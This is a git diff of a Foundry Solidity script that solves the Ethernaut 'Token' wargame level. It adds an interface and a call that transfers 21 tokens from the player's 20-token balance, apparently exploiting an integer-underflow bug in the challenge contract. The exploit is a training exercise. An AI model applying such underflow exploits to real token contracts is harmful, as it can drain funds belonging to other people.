@@ -5,7 +5,10 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
-//  import "../../src/05-TokenAttacker.sol";
+
+interface Token {
+    function transfer(address _to, uint amount) external returns(bool);
+}
 
 contract TokenSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407;
@@ -17,7 +20,8 @@ contract TokenSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
+        Token token = Token(challengeInstance);
+        token.transfer(LEVEL_ADDRESS, 21);
         /*
         // Use Attacker Contract
         TokenAttacker tokenAttacker = new TokenAttacker(challengeInstance);
